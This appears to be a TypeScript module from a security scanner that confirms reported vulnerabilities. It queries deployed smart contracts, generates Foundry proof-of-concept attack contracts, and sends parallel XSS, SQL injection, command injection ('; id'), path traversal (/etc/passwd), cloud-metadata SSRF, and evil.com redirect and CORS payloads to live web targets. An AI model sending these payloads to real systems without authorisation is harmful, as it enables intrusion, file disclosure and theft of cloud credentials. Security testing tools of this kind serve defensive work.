/**
 * Active Vulnerability Validator — REAL exploit testing
 *
 * THREE engines for smart contracts (in order, fail-fast):
 * 1. TARGET ON-CHAIN VALIDATION (cast) — call the deployed contract on mainnet
 * 2. LAB VALIDATION (Foundry/forge) — run the PoC against a local EVM
 * 3. THEORETICAL — fallback when no contract address is available and Foundry
 *    fails. No runtime validation.
 *
 * WEB/MOBILE: HTTP-based payload testing against the production target.
 * ALL requests run in PARALLEL for speed.
 */

import { writeFileSync, mkdirSync, rmSync, existsSync, symlinkSync } from 'fs';
import { join } from 'path';
import { execSync } from 'child_process';

export interface ValidationResult {
  confirmed: boolean;
  evidence: string;
  testOutput?: string;
  gasUsed?: number;
  requestUrl?: string;
  responseStatus?: number;
  responseBody?: string;
  payload?: string;
  validationScope?: 'target' | 'lab' | 'theoretical';
}

// ═══════════════════════════════════════════════════════════════════
// SMART CONTRACT VALIDATION — TARGET ON-CHAIN (cast)
// ═══════════════════════════════════════════════════════════════════

const PUBLIC_RPCS: Record<string, string> = {
  ethereum:  'https://eth.llamarpc.com',
  bsc:       'https://bsc-dataseed.binance.org',
  polygon:   'https://polygon-rpc.com',
  arbitrum:  'https://arb1.arbitrum.io/rpc',
  optimism:  'https://mainnet.optimism.io',
  base:      'https://mainnet.base.org',
  avalanche: 'https://api.avax.network/ext/bc/C/rpc',
  fantom:    'https://rpc.ftm.tools',
};

function getRpcUrl(chain: string): string {
  const alchemy = process.env.ALCHEMY_API_KEY;
  const infura = process.env.INFURA_PROJECT_ID;
  if (alchemy) {
    const alchemyMap: Record<string, string> = {
      ethereum: `https://eth-mainnet.g.alchemy.com/v2/${alchemy}`,
      polygon: `https://polygon-mainnet.g.alchemy.com/v2/${alchemy}`,
      arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${alchemy}`,
      optimism: `https://opt-mainnet.g.alchemy.com/v2/${alchemy}`,
      base: `https://base-mainnet.g.alchemy.com/v2/${alchemy}`,
    };
    if (alchemyMap[chain]) return alchemyMap[chain];
  }
  if (infura) {
    const infuraMap: Record<string, string> = {
      ethereum: `https://mainnet.infura.io/v3/${infura}`,
      polygon: `https://polygon-mainnet.infura.io/v3/${infura}`,
      arbitrum: `https://arbitrum-mainnet.infura.io/v3/${infura}`,
      optimism: `https://optimism-mainnet.infura.io/v3/${infura}`,
      base: `https://base-mainnet.infura.io/v3/${infura}`,
    };
    if (infuraMap[chain]) return infuraMap[chain];
  }
  return PUBLIC_RPCS[chain] || PUBLIC_RPCS.ethereum;
}

/** Detect chain by trying each public RPC in parallel. 3s timeout each. */
async function detectChain(address: string): Promise<string | null> {
  const chains = Object.keys(PUBLIC_RPCS);
  const checks = await Promise.all(chains.map(async (chain) => {
    try {
      const rpc = getRpcUrl(chain);
      const code = execSync(`cast code ${address} --rpc-url ${rpc}`, {
        timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
      }).trim();
      if (code.length > 4) return chain;
    } catch {}
    return null;
  }));
  return checks.find(c => c) || null;
}

interface OnChainState {
  owner: string | null;
  paused: boolean | null;
  totalSupply: string | null;
  balance: string | null;
  bytecodeSize: number;
}

async function queryOnChainState(address: string, chain: string): Promise<OnChainState> {
  const rpc = getRpcUrl(chain);
  const state: OnChainState = {
    owner: null, paused: null, totalSupply: null, balance: null, bytecodeSize: 0,
  };
  try {
    const code = execSync(`cast code ${address} --rpc-url ${rpc}`, {
      timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
    }).trim();
    state.bytecodeSize = Math.floor((code.length - 2) / 2);
  } catch {}
  const callView = (selector: string): string | null => {
    try {
      const out = execSync(`cast call ${address} ${selector} --rpc-url ${rpc}`, {
        timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
      }).trim();
      return out && out.startsWith('0x') && out.length >= 66 ? out : null;
    } catch { return null; }
  };
  const ownerRaw = callView('0x8da5cb5b');
  if (ownerRaw) { state.owner = '0x' + ownerRaw.slice(-40).toLowerCase(); }
  if (!state.owner) {
    const adminRaw = callView('0xf851a440');
    if (adminRaw) { state.owner = '0x' + adminRaw.slice(-40).toLowerCase(); }
  }
  const pausedRaw = callView('0x5c975abb');
  if (pausedRaw) state.paused = pausedRaw.slice(-2) === '01';
  const supplyRaw = callView('0x18160ddd');
  if (supplyRaw) state.totalSupply = BigInt(supplyRaw).toString();
  try {
    const bal = execSync(`cast balance ${address} --rpc-url ${rpc}`, {
      timeout: 3_000, encoding: 'utf-8', stdio: 'pipe',
    }).trim();
    if (bal && /^\d+$/.test(bal)) state.balance = bal;
  } catch {}
  return state;
}

async function validateWithCastOnChain(
  vuln: { type: string; title: string; severity: string; description: string; location: string },
  contractAddress: string,
  chain?: string,
): Promise<ValidationResult> {
  let actualChain = chain || '';
  if (!actualChain) {
    actualChain = (await detectChain(contractAddress)) || '';
    if (!actualChain) {
      return { confirmed: false, validationScope: 'theoretical',
        evidence: `[TARGET-VALIDATION SKIPPED] Could not detect chain for ${contractAddress}.` };
    }
  }
  let state: OnChainState;
  try { state = await queryOnChainState(contractAddress, actualChain); }
  catch (e: any) { return { confirmed: false, validationScope: 'theoretical',
    evidence: `[TARGET-VALIDATION ERROR] ${String(e.message || e).slice(0, 200)}` }; }
  const ev: string[] = [`[TARGET-VALIDATED] Queried ${contractAddress} on ${actualChain}. Bytecode: ${state.bytecodeSize} bytes.`];
  if (state.owner) ev.push(`owner(): ${state.owner}`);
  if (state.paused !== null) ev.push(`paused(): ${state.paused}`);
  if (state.totalSupply) ev.push(`totalSupply(): ${state.totalSupply}`);
  if (state.balance) ev.push(`ETH balance: ${state.balance} wei`);
  let confirmed = false;
  const vt = vuln.type.toLowerCase();
  if ((vt === 'access_control' || vt === 'unauthorized_mint' || vt === 'governance_hijack') && state.owner) {
    if (/^0x0{40}$/i.test(state.owner)) { ev.push(`[TARGET-CONFIRMS] Owner is zero address.`); confirmed = true; }
    else { try { const oc = execSync(`cast code ${state.owner} --rpc-url ${getRpcUrl(actualChain)}`, { timeout: 3_000, encoding: 'utf-8', stdio: 'pipe' }).trim();
      if (oc.length <= 4) { ev.push(`[TARGET-CONFIRMS] Owner ${state.owner} is EOA.`); confirmed = true; }
      else { ev.push(`[TARGET-PARTIAL] Owner is contract (timelock/multisig).`); } } catch {} }
  }
  if ((vt === 'reentrancy' || vt === 'flash_loan' || vt === 'delegatecall') && state.balance) {
    if (BigInt(state.balance) > 0n) { ev.push(`[TARGET-CONFIRMS] Contract holds ${state.balance} wei.`); confirmed = true; }
  }
  if ((vt === 'denial_of_service' || vt === 'permanent_pause') && state.paused !== null) {
    if (state.paused) { ev.push(`[TARGET-CONFIRMS] Contract is paused.`); confirmed = true; }
    else { ev.push(`[TARGET-REFUTES] Contract is NOT paused.`); }
  }
  return { confirmed, validationScope: 'target', evidence: ev.join('\n') };
}

// ═══════════════════════════════════════════════════════════════════
// SMART CONTRACT VALIDATION (Foundry) — LAB SCOPE
// ═══════════════════════════════════════════════════════════════════

function generatePoCTest(sourceCode: string, contractName: string, vuln: any): string {
  const vt = vuln.type.toLowerCase();
  const pocMap: Record<string, string> = {
    reentrancy: `contract ReentrancyAttack { IVulnerable victim; function attack() external payable { victim.deposit{value: msg.value}(); victim.withdraw(); } receive() external payable { if (address(victim).balance >= 1 ether) victim.withdraw(); } }`,
    access_control: `contract AccessControlAttack { function testUnauthorized() public { vm.prank(attacker); target.setOwner(attacker); } }`,
    integer_overflow: `contract IntegerOverflowTest { function testOverflow() public { target.deposit(type(uint256).max); } }`,
  };
  const poc = pocMap[vt] || `contract PoCTest { function testVuln() public { /* generic test */ } }`;
  return `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\nimport "forge-std/Test.sol";\ninterface IVulnerable { function deposit() external payable; function withdraw() external; }\n${poc}`;
}

async function validateWithFoundry(sourceCode: string, contractName: string, vuln: any): Promise<ValidationResult> {
  const nameMatch = sourceCode.match(/contract\s+(\w+)\s*[{(:]/);
  const actualName = contractName || nameMatch?.[1] || 'Target';
  const tmpDir = `/tmp/foundry-${Date.now()}`;
  try {
    mkdirSync(join(tmpDir, 'src'), { recursive: true });
    mkdirSync(join(tmpDir, 'test'), { recursive: true });
    writeFileSync(join(tmpDir, 'src', `${actualName}.sol`), sourceCode);
    writeFileSync(join(tmpDir, 'test', 'PoC.t.sol'), generatePoCTest(sourceCode, actualName, vuln));
    writeFileSync(join(tmpDir, 'foundry.toml'), `[profile.default]\nsrc="src"\nout="out"\nlibs=["lib"]\nsolc_version="0.8.20"\noptimizer=true\n`);
    const FORGE_STD_CACHE = '/opt/forge-lib/forge-std';
    const forgeStdLink = join(tmpDir, 'lib', 'forge-std');
    try {
      mkdirSync(join(tmpDir, 'lib'), { recursive: true });
      if (existsSync(FORGE_STD_CACHE)) { try { symlinkSync(FORGE_STD_CACHE, forgeStdLink, 'dir'); } catch {} }
      else { try { execSync('git init && git add -A && git commit -m init', { cwd: tmpDir, timeout: 5_000, stdio: 'pipe' }); } catch {}
        try { execSync('forge install foundry-rs/forge-std --no-commit --no-git', { cwd: tmpDir, timeout: 30_000, stdio: 'pipe' });
          try { mkdirSync('/opt/forge-lib', { recursive: true }); execSync(`cp -r ${forgeStdLink} ${FORGE_STD_CACHE}`, { timeout: 10_000, stdio: 'pipe' }); } catch {} } catch {} }
    } catch {}
    const result = execSync('forge test -vvv 2>&1', { cwd: tmpDir, timeout: 30_000, encoding: 'utf-8', stdio: 'pipe' });
    const passed = result.includes('[PASS]') || result.includes('SUCCESS');
    const gasMatch = result.match(/(\d+)\s+gas/);
    return passed ? { confirmed: true, validationScope: 'lab',
      evidence: `Foundry PoC PASSED. Gas: ${gasMatch?.[1] || 'n/a'}. This confirms the exploit works in a local EVM, NOT that the deployed contract is exploitable.`,
      testOutput: result.slice(0, 2000), gasUsed: gasMatch ? parseInt(gasMatch[1]) : undefined }
      : { confirmed: false, validationScope: 'lab',
        evidence: `Foundry PoC FAILED — exploit did not succeed under lab conditions.`,
        testOutput: result.slice(0, 2000) };
  } catch (e: any) { return { confirmed: false, validationScope: 'theoretical',
    evidence: `Foundry error: ${String(e.message || e).slice(0, 300)}` }; }
  finally { try { rmSync(tmpDir, { recursive: true, force: true }); } catch {} }
}

// ═══════════════════════════════════════════════════════════════════
// WEB VULNERABILITY VALIDATION (HTTP-based real testing)
// ═══════════════════════════════════════════════════════════════════

interface WebTestPayload {
  name: string;
  payloads: string[];
  check: (response: { status: number; body: string; headers: Record<string, string> }, payload: string) => boolean;
  evidence: (response: { status: number; body: string; headers: Record<string, string> }, payload: string) => string;
}

const XSS_PAYLOADS: WebTestPayload = {
  name: 'XSS',
  payloads: ['<img src=x onerror=alert(1)>', '"><svg onload=alert(1)>', '<svg onload=alert(1)>'],
  check: (resp, payload) => {
    let decoded = payload; try { decoded = decodeURIComponent(payload); } catch {}
    const body = resp.body.toLowerCase();
    if (body.includes(decoded.toLowerCase())) return true;
    if (body.includes('onerror=alert') || body.includes('onload=alert')) return true;
    return false;
  },
  evidence: (resp, payload) => `XSS CONFIRMED: Payload "${payload}" reflected unescaped. HTTP ${resp.status}.`,
};

const SQLI_PAYLOADS: WebTestPayload = {
  name: 'SQL Injection',
  payloads: ["' OR '1'='1", "' OR '1'='1' --", "admin'--"],
  check: (resp, _payload) => {
    const body = resp.body.toLowerCase();
    const sqlErrors = ['sql syntax', 'mysql_fetch', 'ORA-', 'postgresql', 'ERROR:  syntax error',
      'unclosed quotation mark', 'sqlite3.OperationalError', 'SQLSTATE', 'you have an error in your sql syntax'];
    if (sqlErrors.some(e => body.includes(e.toLowerCase()))) return true;
    return false;
  },
  evidence: (resp, payload) => `SQL INJECTION CONFIRMED: Payload "${payload}" triggered SQL error. HTTP ${resp.status}.`,
};

const SSRF_PAYLOADS: WebTestPayload = {
  name: 'SSRF',
  payloads: ['http://169.254.169.254/latest/meta-data/', 'http://localhost:80', 'http://127.0.0.1:80'],
  check: (resp, payload) => {
    const body = resp.body.toLowerCase();
    if (payload.includes('169.254.169.254') && (body.includes('ami-id') || body.includes('instance-id') || body.includes('security-credentials'))) return true;
    if (body.includes('ssh') || body.includes('connection refused')) return true;
    return false;
  },
  evidence: (resp, payload) => `SSRF CONFIRMED: Server fetched internal URL "${payload}". HTTP ${resp.status}.`,
};

const REDIRECT_PAYLOADS: WebTestPayload = {
  name: 'Open Redirect',
  payloads: ['https://evil.com', '//evil.com', 'https:evil.com'],
  check: (resp, payload) => {
    const location = resp.headers['location'] || '';
    if (location.includes('evil.com')) return true;
    return false;
  },
  evidence: (resp, payload) => `OPEN REDIRECT CONFIRMED: Location: "${resp.headers['location'] || 'N/A'}". HTTP ${resp.status}.`,
};

const CMDI_PAYLOADS: WebTestPayload = {
  name: 'Command Injection',
  payloads: ['; id', '| id', '&& whoami'],
  check: (resp, payload) => {
    const body = resp.body;
    if (body.includes('uid=') && body.includes('gid=')) return true;
    if (body.includes('root:x:0:0:')) return true;
    if (payload.includes('whoami') && (body.includes('root') || body.includes('www-data'))) return true;
    return false;
  },
  evidence: (resp, payload) => `COMMAND INJECTION CONFIRMED: Payload "${payload}" executed. HTTP ${resp.status}.`,
};

const PATH_TRAVERSAL_PAYLOADS: WebTestPayload = {
  name: 'Path Traversal',
  payloads: ['../../../etc/passwd', '../../../../windows/win.ini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'],
  check: (resp, _payload) => {
    const body = resp.body.toLowerCase();
    if (body.includes('root:x:0:0:') || body.includes('root:$')) return true;
    if (body.includes('[fonts]') || body.includes('[extensions]')) return true;
    return false;
  },
  evidence: (resp, payload) => `PATH TRAVERSAL CONFIRMED: Payload "${payload}" accessed system files. HTTP ${resp.status}.`,
};

const CORS_TEST: WebTestPayload = {
  name: 'CORS Misconfiguration',
  payloads: ['https://evil.com', 'null'],
  check: (resp, _payload) => {
    const acao = resp.headers['access-control-allow-origin'] || '';
    const acac = resp.headers['access-control-allow-credentials'] || '';
    if (acao === '*' && acac === 'true') return true;
    if (acao && acao !== 'null' && acac === 'true') return true;
    if (acao === 'null' && acac === 'true') return true;
    return false;
  },
  evidence: (resp, payload) => `CORS CONFIRMED: ACAO=${resp.headers['access-control-allow-origin'] || '(none)'} ACAC=${resp.headers['access-control-allow-credentials'] || '(none)'} Origin=${payload}.`,
};

const BROWSER_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
};

async function sendTestRequest(url: string, method: string, payload: string, param: string,
  options: { timeoutMs?: number; followRedirect?: boolean } = {}): Promise<{ status: number; body: string; headers: Record<string, string>; finalUrl: string }> {
  const { timeoutMs = 5_000, followRedirect = true } = options;
  try {
    const params = new URLSearchParams();
    params.set(param, payload);
    const init: RequestInit = { method: method.toUpperCase(), headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...BROWSER_HEADERS },
      signal: AbortSignal.timeout(timeoutMs), redirect: followRedirect ? 'follow' : 'manual' };
    let targetUrl = url;
    if (method.toUpperCase() === 'GET') { const u = new URL(url); u.searchParams.set(param, payload); targetUrl = u.toString(); }
    else { init.body = params.toString(); }
    const resp = await fetch(targetUrl, init);
    const body = await resp.text();
    const headers: Record<string, string> = {};
    resp.headers.forEach((v, k) => { headers[k] = v; });
    return { status: resp.status, body, headers, finalUrl: resp.url || targetUrl };
  } catch { return { status: 0, body: '', headers: {}, finalUrl: url }; }
}

async function discoverTargetParameters(targetUrl: string): Promise<string[]> {
  const discovered = new Set<string>();
  try { const u = new URL(targetUrl); u.searchParams.forEach((_, key) => discovered.add(key)); } catch {}
  try {
    const resp = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(5_000) });
    const html = await resp.text();
    const inputMatches = html.matchAll(/<input[^>]+name=["']([^"']+)["']/gi);
    for (const m of inputMatches) { const name = m[1].trim(); if (name && !name.startsWith('_')) discovered.add(name); }
    const hrefMatches = html.matchAll(/<a[^>]+href=["']([^"']+)["']/gi);
    for (const m of hrefMatches) { try { const url = m[1].startsWith('http') ? new URL(m[1]) : new URL(m[1], targetUrl);
      url.searchParams.forEach((_, key) => discovered.add(key)); } catch {} }
  } catch {}
  const skip = /^(csrf|_token|__|authenticity_token|nonce|session|sid)$/i;
  const filtered = [...discovered].filter(p => !skip.test(p));
  if (filtered.length === 0) filtered.push('q', 'search', 'query', 'id', 'url', 'redirect', 'next', 'return');
  return filtered.slice(0, 3);
}

function extractParamFromVuln(vuln: { location: string; description: string }): string | null {
  const text = `${vuln.location || ''} ${vuln.description || ''}`;
  const m1 = text.match(/param(?:eter)?[=:]\s*([A-Za-z_][A-Za-z0-9_]*)/i);
  if (m1) return m1[1];
  const m2 = text.match(/[?&]([A-Za-z_][A-Za-z0-9_]*)=/);
  if (m2) return m2[1];
  const m3 = text.match(/(?:via|in the)\s*\?([A-Za-z_][A-Za-z0-9_]*)/i);
  if (m3) return m3[1];
  return null;
}

async function validateWebVulnerability(targetUrl: string, vuln: any): Promise<ValidationResult> {
  const vulnType = vuln.type.toLowerCase();
  let testSuite: WebTestPayload | null = null;
  if (vulnType === 'xss') testSuite = XSS_PAYLOADS;
  else if (vulnType === 'sql_injection') testSuite = SQLI_PAYLOADS;
  else if (vulnType === 'ssrf') testSuite = SSRF_PAYLOADS;
  else if (vulnType === 'open_redirect') testSuite = REDIRECT_PAYLOADS;
  else if (vulnType === 'command_injection') testSuite = CMDI_PAYLOADS;
  else if (vulnType === 'path_traversal') testSuite = PATH_TRAVERSAL_PAYLOADS;
  else if (vulnType === 'cors_misconfig') testSuite = CORS_TEST;

  // CSP-missing: single HEAD request, instant
  if (vulnType === 'csp_missing' || vulnType === 'csrf' || vulnType === 'auth_bypass') {
    try {
      const resp = await fetch(targetUrl, { headers: BROWSER_HEADERS, signal: AbortSignal.timeout(5_000) });
      const headers: Record<string, string> = {};
      resp.headers.forEach((v, k) => { headers[k] = v; });
      if (vulnType === 'csp_missing') {
        const csp = headers['content-security-policy'] || '';
        if (!csp) return { confirmed: true, validationScope: 'target',
          evidence: `[TARGET-VALIDATED] CSP-missing confirmed: HTTP ${resp.status} from ${targetUrl} has no Content-Security-Policy header.`,
          requestUrl: targetUrl, responseStatus: resp.status };
        return { confirmed: false, validationScope: 'target',
          evidence: `[TARGET-VALIDATED] CSP-missing REFUTED: CSP is present: ${csp.slice(0, 200)}`,
          requestUrl: targetUrl, responseStatus: resp.status };
      }
    } catch (e: any) { return { confirmed: false, validationScope: 'theoretical',
      evidence: `[TARGET-VALIDATION ERROR] ${String(e.message || e).slice(0, 200)}` }; }
  }

  // CORS: send Origin headers
  if (vulnType === 'cors_misconfig') {
    for (const origin of CORS_TEST.payloads) {
      try {
        const resp = await fetch(targetUrl, { headers: { ...BROWSER_HEADERS, 'Origin': origin }, signal: AbortSignal.timeout(5_000) });
        const headers: Record<string, string> = {};
        resp.headers.forEach((v, k) => { headers[k] = v; });
        const body = await resp.text();
        const fakeResp = { status: resp.status, body, headers };
        if (CORS_TEST.check(fakeResp, origin)) return { confirmed: true, validationScope: 'target',
          evidence: `[TARGET-VALIDATED] ${CORS_TEST.evidence(fakeResp, origin)}`, requestUrl: targetUrl, payload: origin };
      } catch {}
    }
    return { confirmed: false, validationScope: 'target',
      evidence: `[TARGET-VALIDATED] CORS test completed — ${CORS_TEST.payloads.length} origins tested. None triggered misconfiguration.`,
      requestUrl: targetUrl };
  }

  // For payload-based tests (XSS, SQLi, etc): run ALL payloads in PARALLEL
  const mentionedParam = extractParamFromVuln(vuln);
  let candidateParams: string[] = [];
  if (mentionedParam) candidateParams = [mentionedParam];
  else candidateParams = await discoverTargetParameters(targetUrl);

  if (!testSuite) {
    // Unknown type — return lab scope (AI reasoning only)
    return { confirmed: false, validationScope: 'lab',
      evidence: `[LAB-VALIDATED] No active test suite for "${vulnType}". Finding based on AI reasoning only.` };
  }

  // Build ALL test combinations and run in PARALLEL
  const needsNoRedirect = vulnType === 'open_redirect';
  const allTests: Promise<{ confirmed: boolean; evidence: string; payload?: string; status?: number; body?: string }>[] = [];

  for (const param of candidateParams) {
    for (const payload of testSuite.payloads) {
      for (const method of ['GET', 'POST']) {
        allTests.push(
          (async () => {
            const resp = await sendTestRequest(targetUrl, method, payload, param, { followRedirect: !needsNoRedirect });
            if (resp.status === 0) return { confirmed: false, evidence: '' };
            if (testSuite!.check(resp, payload)) return {
              confirmed: true,
              evidence: `[TARGET-VALIDATED] ${testSuite!.evidence(resp, payload)} — ${method} ${targetUrl}?${param}=${payload} (HTTP ${resp.status})`,
              payload, status: resp.status, body: resp.body.slice(0, 500),
            };
            // Open redirect: check Location header
            if (needsNoRedirect && resp.status >= 300 && resp.status < 400) {
              const location = resp.headers['location'] || '';
              if (location.includes('evil.com')) return {
                confirmed: true,
                evidence: `[TARGET-VALIDATED] OPEN REDIRECT CONFIRMED: ${method} ${targetUrl}?${param}=${payload} → HTTP ${resp.status} Location: ${location}`,
                payload, status: resp.status, body: resp.body.slice(0, 500),
              };
            }
            return { confirmed: false, evidence: '' };
          })()
        );
      }
    }
  }

  // Wait for ALL tests in parallel
  const results = await Promise.allSettled(allTests);
  for (const r of results) {
    if (r.status === 'fulfilled' && r.value.confirmed) {
      return { confirmed: true, validationScope: 'target',
        evidence: r.value.evidence, requestUrl: targetUrl, responseStatus: r.value.status, responseBody: r.value.body, payload: r.value.payload };
    }
  }

  const totalTests = allTests.length;
  return { confirmed: false, validationScope: 'target',
    evidence: `[TARGET-VALIDATED] ${testSuite.name} test completed — ${totalTests} HTTP requests sent to ${targetUrl} across ${candidateParams.length} params (${candidateParams.join(', ')}). None confirmed.`,
    requestUrl: targetUrl };
}

// ═══════════════════════════════════════════════════════════════════
// MAIN ENTRY POINT
// ═══════════════════════════════════════════════════════════════════

export async function activelyValidate(
  sourceCode: string,
  contractName: string,
  vuln: { type: string; title: string; severity: string; description: string; location: string },
  _apiKey?: string,
  _model?: string,
): Promise<ValidationResult> {
  const isSmartContract = sourceCode.includes('pragma solidity') ||
    sourceCode.includes('contract ') ||
    vuln.type === 'reentrancy' || vuln.type === 'access_control' ||
    vuln.type === 'tx_origin' || vuln.type === 'integer_overflow' ||
    vuln.type === 'unauthorized_mint' || vuln.type === 'flash_loan' ||
    vuln.type === 'delegatecall' || vuln.type === 'governance_hijack';

  const isWebVuln = vuln.type === 'xss' || vuln.type === 'sql_injection' ||
    vuln.type === 'ssrf' || vuln.type === 'open_redirect' ||
    vuln.type === 'command_injection' || vuln.type === 'path_traversal' ||
    vuln.type === 'cors_misconfig' || vuln.type === 'business_logic' ||
    vuln.type === 'csp_missing' || vuln.type === 'api_leak' ||
    vuln.type === 'csrf' || vuln.type === 'auth_bypass';

  if (isSmartContract) {
    const addressMatch = sourceCode.match(/0x[0-9a-fA-F]{40}/) ||
      vuln.location?.match(/0x[0-9a-fA-F]{40}/) ||
      vuln.description?.match(/0x[0-9a-fA-F]{40}/);
    const contractAddress = addressMatch?.[0];
    if (contractAddress) {
      try {
        const targetResult = await validateWithCastOnChain(vuln, contractAddress);
        if (targetResult.confirmed) return targetResult;
        if (targetResult.evidence.includes('[TARGET-REFUTES]') || targetResult.evidence.includes('REFUTED')) return targetResult;
      } catch {}
    }
    return validateWithFoundry(sourceCode, contractName, vuln);
  }

  if (isWebVuln) {
    const urlMatch = vuln.location?.match(/https?:\/\/[^\s]+/) ||
      vuln.description?.match(/https?:\/\/[^\s]+/) ||
      sourceCode.match(/https?:\/\/[^\s]+/);
    const targetUrl = urlMatch?.[0] || sourceCode;
    if (!targetUrl.startsWith('http')) {
      return { confirmed: false, validationScope: 'theoretical',
        evidence: `Web vulnerability test skipped — no valid URL found. Finding remains at THEORETICAL validation level.` };
    }
    return validateWebVulnerability(targetUrl, vuln);
  }

  // Fallback: try both
  if (sourceCode.includes('pragma solidity')) return validateWithFoundry(sourceCode, contractName, vuln);
  const urlMatch = sourceCode.match(/https?:\/\/[^\s]+/);
  if (urlMatch) return validateWebVulnerability(urlMatch[0], vuln);
  return { confirmed: false, validationScope: 'theoretical',
    evidence: `Could not determine test type for "${vuln.type}". Finding remains at THEORETICAL validation level.` };
}
